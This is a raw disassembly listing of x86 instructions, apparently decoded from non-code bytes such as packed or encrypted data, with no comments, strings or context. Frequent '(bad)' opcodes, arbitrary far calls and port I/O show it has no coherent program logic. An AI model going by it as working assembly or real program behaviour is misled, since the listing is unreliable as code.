  4048f4:	mov    cl,0xd6
  4048f6:	repz mov esp,0x9cd3bb93
  4048fc:	daa    
  4048fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048fe:	and    DWORD PTR [ecx],0x20
  404901:	fld    DWORD PTR [edi+0x35c02a4f]
  404907:	jge    0x40495e
  404909:	fild   WORD PTR [eax]
  40490b:	icebp  
  40490c:	ins    BYTE PTR es:[edi],dx
  40490d:	push   edi
  40490e:	mov    edi,0xd777174f
  404913:	sub    DWORD PTR [esi-0x11],edx
  404916:	jecxz  0x4048eb
  404918:	lds    eax,FWORD PTR [eax]
  40491a:	pop    ebp
  40491b:	loope  0x40495c
  40491d:	and    dl,BYTE PTR [esi]
  40491f:	sub    al,0x4b
  404921:	pushf  
  404922:	cmp    DWORD PTR [ecx+eax*4-0x27],esi
  404926:	enter  0xb0f6,0x22
  40492a:	nop
  40492b:	pop    ebx
  40492c:	ret    0x21e3
  40492f:	mov    al,0x94
  404931:	loopne 0x40492d
  404933:	out    dx,al
  404934:	sbb    ebp,esi
  404936:	into   
  404937:	dec    ecx
  404938:	aad    0xb7
  40493a:	inc    eax
  40493b:	enter  0xb034,0xc8
  40493f:	(bad)  
  404940:	mov    ecx,0x38da7e43
  404945:	push   ss
  404946:	fwait
  404947:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404948:	push   edi
  404949:	push   eax
  40494a:	cmp    bh,BYTE PTR [eax+0x415e4f5c]
  404950:	test   eax,0x92fcd7ab
  404955:	sahf   
  404956:	outs   dx,BYTE PTR ds:[esi]
  404957:	ds sub al,0xc2
  40495a:	mov    edx,edx
  40495c:	retf   0x37ab
  40495f:	into   
  404960:	push   es
  404961:	pop    edi
  404962:	mov    bl,0xd5
  404964:	mov    ds:0xa1a6b15,al
  404969:	sar    ebp,0xf6
  40496c:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40496e:	pushf  
  40496f:	pop    esi
  404970:	cdq    
  404971:	(bad)  
  404972:	adc    ecx,edi
  404974:	jb     0x4049b1
  404976:	arpl   cx,ax
  404978:	fs mov ebp,0x5ce50e82
  40497e:	jb     0x404909
  404980:	cwde   
  404981:	jge    0x404953
  404983:	aas    
  404984:	push   ebx
  404985:	lahf   
  404986:	jns    0x40490a
  404988:	out    dx,al
  404989:	inc    ecx
  40498a:	dec    edx
  40498b:	sub    al,0x35
  40498d:	add    bh,ah
  40498f:	mov    ds:0x255aeec8,eax
  404994:	mov    ds:0x63c62af,eax
  404999:	dec    ebp
  40499a:	je     0x40491e
  40499c:	mov    bh,0xd1
  40499e:	dec    esp
  40499f:	inc    ecx
  4049a0:	test   eax,0xfd75a828
  4049a5:	mov    bl,0x85
  4049a7:	mov    esi,0xb4824854
  4049ac:	mov    ds:0x43ec70fe,eax
  4049b1:	cmp    DWORD PTR [edi+0x52074ca8],ebx
  4049b7:	jp     0x404945
  4049b9:	rcr    BYTE PTR [esi],1
  4049bb:	fucom  st(3)
  4049bd:	bound  edi,QWORD PTR [edi+0x1a]
  4049c0:	in     eax,dx
  4049c1:	sub    edx,DWORD PTR [edx-0x501b15da]
  4049c7:	test   DWORD PTR [ebx-0x5e],edx
  4049ca:	loopne 0x404995
  4049cc:	lea    edx,[edx+esi*8+0x10d346e1]
  4049d3:	cmp    ebx,DWORD PTR [ebp+0x36d76767]
  4049d9:	push   ss
  4049da:	cli    
  4049db:	sbb    ch,BYTE PTR [edx+0x7bad2dd6]
  4049e1:	add    al,0xb7
  4049e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049e4:	inc    esi
  4049e5:	retf   0x4392
  4049e8:	ins    DWORD PTR es:[edi],dx
  4049e9:	inc    edx
  4049ea:	outs   dx,BYTE PTR ds:[esi]
  4049eb:	fcom   st(4)
  4049ed:	push   esi
  4049ee:	(bad)
  4049f2:	sbb    al,0x8e
  4049f4:	pop    DWORD PTR [eax-0x7440e86]
  4049fa:	mov    bl,0xfc
  4049fc:	jecxz  0x404a40
  4049fe:	add    BYTE PTR [edx+0x31948982],dl
  404a04:	cmp    DWORD PTR [esi],ecx
  404a06:	mov    ebp,0xd5fda6b8
  404a0b:	dec    al
  404a0d:	cld    
  404a0e:	in     eax,0xcf
  404a10:	jb     0x404a1c
  404a12:	mov    edx,0x9be1e4a2
  404a17:	jbe    0x404a58
  404a19:	jp     0x404a96
  404a1b:	jl     0x404a67
  404a1d:	sbb    cl,BYTE PTR [edx-0x44]
  404a20:	scas   eax,DWORD PTR es:[edi]
  404a21:	out    dx,eax
  404a22:	scas   al,BYTE PTR es:[edi]
  404a23:	and    al,0xbc
  404a25:	call   0x6fa:0xaeaa9ec9
  404a2c:	sub    eax,0x6c4de8c1
  404a31:	dec    ebx
  404a32:	mov    esi,0x1877ee71
  404a37:	push   esp
  404a38:	inc    ebx
  404a39:	lods   eax,DWORD PTR ds:[esi]
  404a3a:	mov    es,WORD PTR [ebx]
  404a3c:	sti    
  404a3d:	popa   
  404a3e:	cwde   
  404a3f:	ins    DWORD PTR es:[edi],dx
  404a40:	popf   
  404a41:	jp     0x4049d8
  404a43:	mov    esi,0x9552d44c
  404a48:	fbld   TBYTE PTR ds:0xf5fdf187
  404a4e:	pop    esi
  404a4f:	icebp  
  404a50:	push   edx
  404a51:	clc    
  404a52:	dec    eax
  404a53:	sbb    cl,BYTE PTR [esi-0x7ebfa1e9]
  404a59:	scas   al,BYTE PTR es:[edi]
  404a5a:	ret    0x4c3c
  404a5d:	jge    0x404a3a
  404a5f:	aas    
  404a60:	mov    bh,bh
  404a62:	push   es
  404a63:	(bad)  
  404a64:	jmp    0x404a60
  404a66:	or     eax,0x8094d7e5
  404a6b:	and    dl,BYTE PTR [edi]
  404a6d:	inc    ecx
  404a6e:	loope  0x404a1e
  404a70:	sub    eax,0x4d0f08d1
  404a75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a76:	push   esp
  404a77:	shl    BYTE PTR [ebx],cl
  404a79:	push   ss
  404a7a:	mov    DWORD PTR [edx+0x5],ebp
  404a7d:	into   
  404a7e:	outs   dx,DWORD PTR ds:[esi]
  404a7f:	fs inc esi
  404a81:	ds shl cl,1
  404a84:	fld    TBYTE PTR [edi+0x7142dac6]
  404a8a:	or     eax,0xb7588a1
  404a8f:	sbb    BYTE PTR [edi-0x566f8097],al
  404a95:	xor    BYTE PTR [esi],ch
  404a97:	in     al,0x94
  404a99:	loopne 0x404ac2
  404a9b:	mov    eax,ds:0x3138e439
  404aa0:	pushf  
  404aa1:	xchg   edx,eax
  404aa2:	lock fs inc ebx
  404aa5:	xchg   eax,esp
  404aa7:	popa   
  404aa8:	test   eax,0x97de475e
  404aad:	(bad)  
  404aae:	aam    0x26
  404ab0:	sbb    al,0x33
  404ab2:	mov    ch,BYTE PTR [edx-0x3bfa6c7e]
  404ab8:	(bad)  
  404ab9:	jo     0x404aae
  404abb:	xor    eax,0x6e4792fe
  404ac0:	dec    esi
  404ac1:	jb     0x404b25
  404ac3:	mov    ch,0x6d
  404ac5:	pop    ebx
  404ac6:	ins    BYTE PTR es:[edi],dx
  404ac7:	dec    esp
  404ac8:	and    DWORD PTR [ebx+0x87d5add],ebp
  404ace:	mov    eax,0x47084d53
  404ad3:	push   0xb1fadb9d
  404ad8:	push   edi
  404ad9:	xchg   ebp,eax
  404ada:	pusha  
  404adb:	and    esp,ebx
  404add:	mov    bl,0x18
  404adf:	call   0xa4d22b83
  404ae4:	mov    ds:0x84e93132,eax
  404ae9:	add    dl,BYTE PTR [ecx-0x2c]
  404aec:	mov    ds:0x652223ab,al
  404af1:	es xchg edi,eax
  404af3:	mov    esi,0x2ce05a6d
  404af8:	push   ebp
  404af9:	out    dx,eax
  404afa:	sub    esp,DWORD PTR [edx]
  404afc:	repz pop eax
  404afe:	add    ch,al
  404b00:	xor    DWORD PTR [ebx+edi*1-0x32e8c1b],ebx
  404b07:	xor    eax,0x23debc31
  404b0d:	push   ds
  404b0e:	jns    0x404b72
  404b10:	lods   al,BYTE PTR ds:[esi]
  404b11:	jno    0x404b64
  404b13:	dec    edx
  404b14:	sbb    al,0x2
  404b16:	stc    
  404b17:	mov    ah,0x69
  404b19:	jge    0x404acc
  404b1b:	in     eax,dx
  404b1c:	gs xchg edi,eax
  404b1e:	icebp  
  404b1f:	not    BYTE PTR [eax]
  404b21:	sbb    ebp,DWORD PTR [edx-0x3fdadde3]
  404b27:	pop    ebx
  404b28:	imul   esp,DWORD PTR [eax+0x4f],0x2aa181e1
  404b2f:	or     eax,0x9db1c337
  404b34:	cbw    
  404b36:	push   0x70348530
  404b3b:	in     eax,0x85
  404b3d:	lock push cs
  404b3f:	cmp    eax,0xb1b22e0f
  404b44:	std    
  404b45:	sub    edi,0x55f744f4
  404b4b:	test   DWORD PTR [edx+0x8],esp
  404b4e:	cmp    bl,BYTE PTR [eax]
  404b50:	adc    esi,edi
  404b52:	add    al,ah
  404b54:	cwde   
  404b55:	push   0xffffff82
  404b57:	cdq    
  404b58:	lods   al,BYTE PTR ds:[esi]
  404b59:	adc    edx,DWORD PTR [eax]
  404b5b:	mov    ch,0xd
  404b5d:	push   eax
  404b5e:	add    al,0x42
  404b60:	scas   eax,DWORD PTR es:[edi]
  404b61:	call   0x9ee2:0x1ce129b3
  404b68:	jecxz  0x404b15
  404b6a:	mov    cl,0x84
  404b6c:	popf   
  404b6d:	push   ss
  404b6e:	jb     0x404b02
  404b70:	xchg   DWORD PTR [esi*1-0x5812d476],esp
  404b77:	out    dx,eax
  404b78:	xchg   DWORD PTR [edi-0x7a],ecx
  404b7b:	jo     0x404bbd
  404b7d:	adc    dl,BYTE PTR [ebx-0x53]
  404b80:	push   esp
  404b81:	adc    eax,0xffffffc2
  404b84:	mov    bl,0xeb
  404b86:	mov    esp,0xc0bc5e42
  404b8b:	jno    0x404bd2
  404b8d:	sbb    al,0x9c
  404b8f:	add    eax,DWORD PTR [edx+0x647aefd]
  404b95:	enter  0x5439,0x1
  404b99:	nop
  404b9a:	retf   
  404b9b:	push   ss
  404b9c:	outs   dx,BYTE PTR ds:[esi]
  404b9d:	loopne 0x404c13
  404b9f:	jb     0x404bf3
  404ba1:	in     eax,0xf7
  404ba3:	add    al,0xd6
  404ba5:	mov    ecx,0x5848e42f
  404baa:	adc    eax,0x18e607f2
  404baf:	inc    esi
  404bb0:	pop    ecx
  404bb1:	cdq    
  404bb2:	fisttp DWORD PTR [esi+0x60]
  404bb5:	ja     0x404bd9
  404bb7:	test   BYTE PTR [ebx],cl
  404bb9:	add    bl,BYTE PTR [ebp+edi*4+0x25ebd2c5]
  404bc0:	ins    BYTE PTR es:[edi],dx
  404bc1:	fdiv   st(5),st
  404bc3:	repz mov ebp,0xc2dd1a62
  404bc9:	xchg   ecx,eax
  404bca:	aaa    
  404bcb:	adc    DWORD PTR [ebx+0x33],edx
  404bce:	cs dec edi
  404bd0:	push   esp
  404bd1:	mov    WORD PTR [ebx],fs
  404bd3:	in     eax,0x81
  404bd5:	fidiv  WORD PTR [esi-0x24]
  404bd8:	out    dx,eax
  404bd9:	rcl    bh,1
  404bdb:	gs sub edx,ecx
  404bde:	inc    esp
  404bdf:	jne    0x404b84
  404be1:	inc    ecx
  404be2:	sbb    BYTE PTR [edi+0x34031781],0xe5
  404be9:	lods   al,BYTE PTR ds:[esi]
  404bea:	push   edx
  404beb:	stos   BYTE PTR es:[edi],al
  404bec:	push   ss
  404bed:	push   ebp
  404bee:	lods   eax,DWORD PTR ds:[esi]
  404bef:	lea    esp,[ebp+0xe0ed97a]
  404bf5:	imul   edi,edi,0x60
  404bf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bf9:	sub    al,dh
  404bfb:	out    0xd0,al
  404bfd:	mov    ebp,0x6c67a19c
  404c02:	das    
  404c03:	push   esp
  404c04:	fwait
  404c05:	out    0xf8,eax
  404c07:	cmp    ecx,DWORD PTR [esi+edi*1+0x2b014036]
  404c0e:	xchg   esp,eax
  404c0f:	mov    edi,0xa0043ae3
  404c14:	inc    ecx
  404c15:	sbb    al,0xc9
  404c17:	dec    esi
  404c18:	inc    esp
  404c19:	ins    DWORD PTR es:[edi],dx
  404c1a:	cmp    eax,0x24d789e8
  404c1f:	xchg   BYTE PTR [edi],bh
  404c21:	or     BYTE PTR [esi-0x1a],al
  404c24:	sete   BYTE PTR [edx-0x3023764e]
  404c2b:	iret   
  404c2c:	push   ds
  404c2d:	cmp    DWORD PTR [ebp+0x42],edx
  404c30:	xor    BYTE PTR [ebx-0x7b],al
  404c33:	and    dl,BYTE PTR [esi]
  404c35:	jl     0x404c15
  404c37:	sbb    al,0x85
  404c39:	mov    ecx,0x5db6683
  404c3f:	shr    ebp,0xd4
  404c42:	stos   DWORD PTR es:[edi],eax
  404c43:	xchg   DWORD PTR [edx+0x74963b95],esi
  404c49:	sbb    ah,BYTE PTR [ecx-0x5d]
  404c4c:	test   BYTE PTR [ecx+0x49ee24d0],ah
  404c52:	retf   0x72ee
  404c55:	and    eax,0xb68d912d
  404c5a:	ret    0xe64f
  404c5d:	sub    eax,0x4b7ac97a
  404c62:	adc    cl,BYTE PTR [ebp-0x5a]
  404c65:	pop    ds
  404c66:	cld    
  404c67:	or     BYTE PTR [ebx],dl
  404c69:	test   al,0x4b
  404c6b:	push   eax
  404c6c:	sub    DWORD PTR [ebx-0x1c23855b],ecx
  404c72:	leave  
  404c73:	call   0xd733:0xd09d44bc
  404c7a:	inc    ebp
  404c7b:	and    ebp,esi
  404c7d:	icebp  
  404c7e:	add    al,0x32
  404c80:	repz pusha 
  404c82:	mov    eax,ds:0x603bb8a5
  404c87:	pop    esi
  404c88:	imul   ebx,DWORD PTR [eax-0x552937d2],0xf95ecd22
  404c92:	lods   al,BYTE PTR ds:[esi]
  404c93:	add    al,0x33
  404c95:	add    DWORD PTR [eax-0x524beee6],ebx
  404c9b:	fild   DWORD PTR [ebx]
  404c9d:	sbb    al,0xe6
  404c9f:	mov    eax,ds:0x63f14c8c
  404ca4:	int3   
  404ca5:	push   0xffffff8b
  404ca7:	das    
  404ca8:	popa   
  404ca9:	sbb    al,0xc9
  404cab:	inc    edi
  404cac:	int    0x1f
  404cae:	add    eax,0x85ffcbf4
  404cb3:	pop    es
  404cb4:	test   BYTE PTR [edx],dh
  404cb6:	push   ecx
  404cb7:	call   0x2d1460d8
  404cbc:	loopne 0x404cdd
  404cbe:	mov    bl,BYTE PTR [ebx+0x72]
  404cc1:	jnp    0x404cf3
  404cc3:	cmp    eax,0x46aba2b0
  404cc8:	mov    edx,0x358bf1ad
  404ccd:	jmp    0xb3a8:0x5e9086b0
  404cd4:	mov    esi,0x6715a1ed
  404cd9:	and    bp,WORD PTR [eax]
  404cdc:	imul   esp,ebp,0x36
  404cdf:	sti    
  404ce0:	push   ds
  404ce1:	jb     0x404ca7
  404ce3:	mov    cl,0xe0
  404ce5:	daa    
  404ce6:	ss cmp ebp,edx
  404ce9:	add    al,0x4c
  404ceb:	sub    esi,ebp
  404ced:	xor    bh,BYTE PTR [ebx-0x25]
  404cf0:	addr16 out 0xe0,al
  404cf3:	dec    esp
  404cf4:	pop    ebp
  404cf5:	and    DWORD PTR [edx-0x2a],eax
  404cf8:	mov    ds:0xc7b95eb5,eax
  404cfd:	jmp    0xd74889c2
  404d02:	fld    QWORD PTR [edx]
  404d04:	dec    edx
  404d05:	mov    ch,0xf
  404d07:	mov    ah,0x81
  404d09:	ja     0x404d24
  404d0b:	adc    dl,ah
  404d0d:	cmc    
  404d0e:	rcl    BYTE PTR [esi-0x77],1
  404d11:	xchg   BYTE PTR [esi+ebp*2-0x53],bl
  404d15:	cs call 0xc19a:0xf580e1c7
  404d1d:	imul   eax,DWORD PTR [edx],0x982a7dce
  404d23:	mov    edx,0xea6ea6b7
  404d28:	mov    cs,ecx
  404d2a:	int3   
  404d2b:	mov    eax,eax
  404d2d:	jno    0x404d40
  404d2f:	jns    0x404d64
  404d31:	or     eax,0xbbf536b2
  404d36:	sahf   
  404d37:	shr    DWORD PTR ds:0xe26c9c11,0x42
  404d3e:	cmp    edi,DWORD PTR [ecx-0x2c6f7bae]
  404d44:	shr    BYTE PTR [eax],0xf4
  404d47:	mov    DWORD PTR [edx+0x52],esp
  404d4a:	cmp    bl,BYTE PTR [edi-0x2c]
  404d4d:	xor    al,0x9d
  404d4f:	daa    
  404d50:	iret   
  404d51:	mov    al,dh
  404d53:	and    edi,DWORD PTR [ebx-0x47]
  404d56:	cdq    
  404d57:	repz test BYTE PTR [ebx],dl
  404d5a:	sbb    DWORD PTR [eax+0xaccd914],esp
  404d60:	push   ebp
  404d61:	and    DWORD PTR [esi-0x1a461c30],edi
  404d67:	pop    ebp
  404d68:	imul   esp,eax,0x33
  404d6b:	pusha  
  404d6c:	jb     0x404dd4
  404d6e:	pop    edx
  404d6f:	jmp    0x404d18
  404d71:	xor    ebx,ecx
  404d73:	out    0xb5,al
  404d75:	ins    DWORD PTR es:[edi],dx
  404d76:	shl    BYTE PTR [ebx-0x15],1
  404d79:	jae    0x404d02
  404d7b:	mov    BYTE PTR [esi-0x19],cl
  404d7e:	mov    ecx,0x637e29d8
  404d83:	jle    0x404d8f
  404d85:	xchg   esp,eax
  404d86:	xchg   ecx,eax
  404d87:	push   es
  404d88:	clc    
  404d89:	mov    edx,0xb9da1503
  404d8e:	push   esi
  404d8f:	in     eax,0x72
  404d91:	das    
  404d92:	mov    edi,0xd1c2581b
  404d97:	fidiv  WORD PTR [esi+0xf]
  404d9a:	fwait
  404d9b:	add    al,0x18
  404d9d:	inc    eax
  404d9e:	xor    eax,0x7cbb1cc9
  404da3:	sub    ebx,DWORD PTR [edi]
  404da5:	xchg   ebp,eax
  404da6:	and    BYTE PTR [ebx+0xb],ah
  404da9:	ins    BYTE PTR es:[edi],dx
  404daa:	mov    esi,0x9902eed6
  404daf:	jno    0x404d63
  404db1:	mov    DWORD PTR [esi-0x6e8c1ef6],ecx
  404db7:	mov    DWORD PTR [eax-0x48e3336e],ecx
  404dbd:	retf   
  404dbe:	stos   DWORD PTR es:[edi],eax
  404dbf:	inc    ebx
  404dc0:	xchg   ebp,eax
  404dc1:	xchg   edi,eax
  404dc2:	imul   edi,DWORD PTR [edi-0xf],0x67
  404dc6:	jbe    0x404da5
  404dc8:	adc    al,0xf0
  404dca:	into   
  404dcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404dcc:	retf   
  404dcd:	js     0x404e35
  404dcf:	push   ecx
  404dd0:	mov    cl,0x3d
  404dd2:	in     eax,dx
  404dd3:	cmp    BYTE PTR [esi],dl
  404dd5:	jno    0x404dda
  404dd7:	sub    edi,DWORD PTR [edi+0x7b]
  404dda:	outs   dx,DWORD PTR ds:[esi]
  404ddb:	pop    DWORD PTR [eax]
  404ddd:	xchg   edi,eax
  404dde:	mov    WORD PTR [edx-0x7dd60cca],fs
  404de4:	xchg   edx,eax
  404de5:	dec    ebp
  404de6:	jbe    0x404dca
  404de8:	fidivr DWORD PTR [edi*8-0x1d5f77b0]
  404def:	ss adc al,0x23
  404df2:	ret    
  404df3:	addr16 repnz addr16 xchg edx,eax
  404df7:	jl     0x404e64
  404df9:	(bad)  
  404dfa:	xor    eax,0x888c742f
  404dff:	cmp    al,0x4c
  404e01:	xor    eax,DWORD PTR [ebp+ebx*8+0x141e414d]
  404e08:	mov    ebp,0x7b0c8d81
  404e0d:	es mov bl,0x8c
  404e10:	sub    DWORD PTR [edx-0x494ac5a6],esp
  404e16:	bound  esp,QWORD PTR [edi]
  404e18:	xor    ebx,DWORD PTR [edi+edi*8+0x55f1afad]
  404e1f:	and    esp,DWORD PTR [ecx+0x87caf]
  404e25:	sti    
  404e26:	lods   al,BYTE PTR ds:[esi]
  404e27:	pop    ds
  404e28:	mov    eax,0x1833580e
  404e2d:	popf   
  404e2e:	mov    edx,0x3f0e3a5d
  404e33:	inc    ebx
  404e34:	out    dx,al
  404e35:	and    BYTE PTR ds:0xa68b294c,dl
  404e3b:	out    0x64,eax
  404e3d:	inc    ebp
  404e3e:	jbe    0x404e9d
  404e40:	loopne 0x404ebf
  404e42:	jecxz  0x404e8b
  404e44:	inc    ebp
  404e45:	cs pop esp
  404e47:	fidivr DWORD PTR [ebp+0x5a7627ce]
  404e4d:	mov    bl,0xba
  404e4f:	cwde   
  404e50:	and    ch,ah
  404e52:	test   al,0x7a
  404e54:	lods   eax,DWORD PTR ds:[esi]
  404e55:	shl    DWORD PTR [esi-0x3a],cl
  404e58:	xor    edi,DWORD PTR [eax+0x73]
  404e5b:	inc    ebx
  404e5c:	add    eax,0x947f7666
  404e61:	push   cs
  404e62:	push   ecx
  404e63:	and    cl,BYTE PTR [eax-0x7760c43e]
  404e69:	or     bh,BYTE PTR [edx+eax*4]
  404e6c:	dec    ecx
  404e6d:	daa    
  404e6e:	mov    ds:0x2d3d4d66,eax
  404e73:	scas   eax,DWORD PTR es:[edi]
  404e74:	sbb    edi,DWORD PTR [ebx]
  404e76:	dec    edx
  404e77:	xchg   esi,eax
  404e78:	fst    DWORD PTR [ecx-0x687dabee]
  404e7e:	daa    
  404e7f:	sub    DWORD PTR [eax+0x37e45cfc],esi
  404e85:	out    dx,al
  404e86:	loopne 0x404e17
  404e88:	inc    eax
  404e89:	hlt    
  404e8a:	and    BYTE PTR [edx-0x43],0xef
  404e8e:	mov    ah,0x12
  404e90:	cmp    BYTE PTR [edx-0x4723f3b3],ch
  404e96:	adc    ecx,DWORD PTR [ebp+0x4425634c]
  404e9c:	mov    ds:0x4aba3ee8,al
  404ea1:	fidiv  WORD PTR [esi]
  404ea3:	pop    edi
  404ea4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ea5:	sub    al,0xdb
  404ea7:	fistp  QWORD PTR [esi]
  404ea9:	xchg   ecx,eax
  404eab:	(bad)  
  404eac:	iret   
  404ead:	jmp    0x404ef3
  404eaf:	mov    ecx,0x397d3aed
  404eb4:	adc    edx,esp
  404eb6:	push   ebp
  404eb7:	and    al,BYTE PTR [esi+ebp*8+0x7a]
  404ebb:	cld    
  404ebc:	jp     0x404ef6
  404ebe:	hlt    
  404ebf:	lahf   
  404ec0:	ins    BYTE PTR es:[edi],dx
  404ec1:	mov    dh,0x43
  404ec3:	inc    ebp
  404ec4:	xor    al,0xd9
  404ec6:	push   ds
  404ec7:	dec    edx
  404ec8:	mov    ecx,0xb717886d
  404ecd:	bound  esp,QWORD PTR [esi]
  404ecf:	sbb    BYTE PTR [esi+0x69e3f8a4],ah
  404ed5:	(bad)
  404ed8:	lahf   
  404ed9:	and    esp,esi
  404edb:	aad    0x65
  404edd:	sahf   
  404ede:	fcom   st(5)
  404ee0:	adc    ebp,DWORD PTR [esi]
  404ee2:	rcr    cl,1
  404ee4:	nop
  404ee5:	loope  0x404f04
  404ee7:	xor    eax,0x14332cd2
  404eec:	clc    
  404eed:	rcr    BYTE PTR [esi+0x591e367c],1
  404ef3:	test   BYTE PTR [edi],al
  404ef5:	loop   0x404ebc
  404ef7:	sub    DWORD PTR [ebx],edi
  404ef9:	and    eax,DWORD PTR [eax]
  404efb:	xchg   ebx,eax
  404efc:	daa    
  404efd:	xor    DWORD PTR [esi+0x56e91f01],eax
  404f03:	cmc    
  404f04:	xor    eax,0x6dd54a27
  404f09:	and    BYTE PTR [ecx],dh
  404f0b:	pushf  
  404f0c:	mov    dl,0xb3
  404f0e:	fs inc eax
  404f10:	mov    cl,0x6f
  404f12:	in     al,dx
  404f13:	cli    
  404f14:	push   0xfffffff5
  404f16:	icebp  
  404f17:	or     DWORD PTR [eax-0x513bbe50],edx
  404f1d:	jb     0x404f31
  404f1f:	sbb    al,0x5c
  404f21:	jge    0x404f3f
  404f23:	(bad)  
  404f24:	out    dx,al
  404f25:	fsub   st(2),st
  404f27:	sub    esp,eax
  404f29:	popa   
  404f2a:	lods   al,BYTE PTR ds:[esi]
  404f2b:	jns    0x404fa7
  404f2d:	jne    0x404f58
  404f2f:	jmp    0x2932c1c8
  404f34:	test   eax,0xca25b5fc
  404f39:	push   0x8cbb31b8
  404f3e:	xor    eax,0xf10c3f83
  404f43:	sub    dl,BYTE PTR ds:0x6c849428
  404f49:	(bad)  
  404f4a:	repnz and DWORD PTR [ecx],ebp
  404f4d:	xor    al,0x28
  404f4f:	cld    
  404f50:	xchg   esp,eax
  404f51:	shr    bl,1
  404f53:	test   DWORD PTR ds:0xbe2e3a06,edi
  404f59:	pop    esp
  404f5a:	jg     0x404fa2
  404f5c:	stos   DWORD PTR es:[edi],eax
  404f5d:	add    BYTE PTR [eax-0xcf41005],ch
  404f63:	jmp    DWORD PTR [ecx+0x14564a1a]
  404f69:	stos   BYTE PTR es:[edi],al
  404f6a:	aaa    
  404f6b:	mov    ebp,0xcc9d327a
  404f70:	dec    ebx
  404f71:	test   BYTE PTR [edx+0x18],ch
  404f74:	adc    al,BYTE PTR [esi+0x7de282e3]
  404f7a:	cmp    DWORD PTR [edx],0xffffffd7
  404f7d:	ja     0x404fd9
  404f7f:	or     BYTE PTR [ecx],ch
  404f81:	sbb    al,0x5c
  404f83:	popf   
  404f84:	mov    cl,0x7d
  404f86:	leave  
  404f87:	ja     0x404f74
  404f89:	(bad)  
  404f8a:	push   ebx
  404f8b:	retf   
  404f8c:	jo     0x404f4f
  404f8e:	sub    al,0xd9
  404f90:	cli    
  404f91:	mov    dh,BYTE PTR [ebp-0x3a]
  404f94:	and    DWORD PTR [esi],0xffffffd1
  404f97:	dec    eax
  404f98:	lds    eax,FWORD PTR [esp+edi*2-0x4789bcfb]
  404f9f:	rcr    DWORD PTR [eax],cl
  404fa1:	fwait
  404fa2:	dec    ecx
  404fa3:	shl    BYTE PTR [edi+0x19],1
  404fa6:	push   ds
  404fa7:	add    dl,BYTE PTR ds:0xaafd4f04
  404fad:	int    0xa9
  404faf:	xchg   esi,eax
  404fb0:	lds    edi,FWORD PTR [ecx]
  404fb2:	dec    edx
  404fb3:	hlt    
  404fb4:	mov    ds,WORD PTR [ebx]
  404fb6:	clc    
  404fb7:	xor    al,0x4a
  404fb9:	jb     0x404f84
  404fbb:	leave  
  404fbc:	mov    DWORD PTR [edx-0x35c80900],esp
  404fc2:	test   eax,0xda0ced41
  404fc7:	rol    BYTE PTR [eax],cl
  404fc9:	pop    ds
  404fca:	mov    ecx,0xb42f2c77
  404fcf:	lahf   
  404fd0:	call   0xdf04:0x833987b3
  404fd7:	rcl    BYTE PTR ds:0xfc6d345b,0x78
  404fde:	pop    ebx
  404fdf:	and    edx,DWORD PTR [ecx]
  404fe1:	push   ds
  404fe2:	and    BYTE PTR [ecx],al
  404fe4:	or     eax,0xc283aee2
  404fe9:	sub    eax,0xfdd60a76
  404fee:	jb     0x404fc8
  404ff0:	xor    eax,0x90f70a9f
  404ff5:	mov    eax,0x591fba1d
  404ffa:	mov    ecx,0xf292d431
  404fff:	out    dx,eax
  405000:	or     al,0x7e
  405002:	jecxz  0x405013
  405004:	inc    ecx
  405005:	xchg   esp,eax
  405006:	mov    DWORD PTR [edx],ebx
  405008:	cwde   
  405009:	and    BYTE PTR [ecx+0x1b],al
  40500c:	ds jb  0x405082
  40500f:	fcmovnu st,st(4)
  405011:	mov    ebx,0x20c984b6
  405016:	mov    WORD PTR [edi],ds
  405018:	push   ds
  405019:	pop    es
  40501a:	test   al,0xa0
  40501c:	adc    DWORD PTR [ecx],0x52137b86
  405022:	sbb    dh,BYTE PTR [ebp+0x3eaac6e1]
  405028:	mov    ebx,0xcce162fd
  40502d:	xchg   ebp,eax
  40502e:	rol    ecx,cl
  405030:	out    dx,eax
  405031:	int3   
  405032:	dec    ebx
  405033:	xchg   esi,eax
  405034:	ins    BYTE PTR es:[edi],dx
  405035:	sub    ah,BYTE PTR [ecx+0x65]
  405038:	adc    al,0x31
  40503a:	repnz out 0x1f,al
  40503d:	ja     0x404fea
  40503f:	dec    DWORD PTR [esi+0x2f]
  405042:	imul   bp,WORD PTR [esi-0x79d061fb],0xc4f5
  40504b:	cmc    
  40504c:	dec    ebx
  40504d:	adc    edi,0xffffffdc
  405050:	loopne 0x40503d
  405052:	leave  
  405053:	or     BYTE PTR [ecx+eax*4-0x2],0x7
  405058:	loopne 0x4050ad
  40505a:	xchg   esp,eax
  40505b:	out    0x71,al
  40505d:	div    BYTE PTR [ebp-0x6fddd6b0]
  405063:	cmp    DWORD PTR [ecx+0x5fc96568],0x2e
  40506a:	push   esp
  40506b:	fwait
  40506c:	pop    eax
  40506d:	leave  
  40506e:	xchg   ebp,eax
  40506f:	or     al,BYTE PTR cs:[esi+0x18]
  405073:	addr16 jle 0x405033
  405076:	dec    esp
  405077:	loopne 0x405083
  405079:	push   ebp
  40507a:	jbe    0x405001
  40507c:	fld    TBYTE PTR [eax-0x17]
  40507f:	mov    BYTE PTR [edi],ch
  405081:	ins    DWORD PTR es:[edi],dx
  405082:	xchg   BYTE PTR [esi-0x56d80989],dh
  405088:	inc    edi
  405089:	sub    BYTE PTR [esi+edi*8+0x5aededb6],cl
  405090:	mov    dh,0xc1
  405092:	mov    ebp,0x50566888
  405097:	or     al,0x5
  405099:	jne    0x4050bc
  40509b:	retf   
  40509c:	push   ss
  40509d:	push   ss
  40509e:	inc    edi
  40509f:	into   
  4050a0:	shl    BYTE PTR [ecx],1
  4050a2:	or     eax,0x9fe8703a
  4050a7:	fisttp QWORD PTR [ebp+0x54]
  4050aa:	add    al,dh
  4050ac:	cmp    bl,BYTE PTR ds:0xd98486f6
  4050b2:	xor    BYTE PTR [ebp-0x36d7a0f],bl
  4050b8:	cmp    al,0x15
  4050ba:	push   ecx
  4050bb:	sbb    DWORD PTR [ebp-0x78aff00d],ebx
  4050c1:	lods   eax,DWORD PTR ds:[esi]
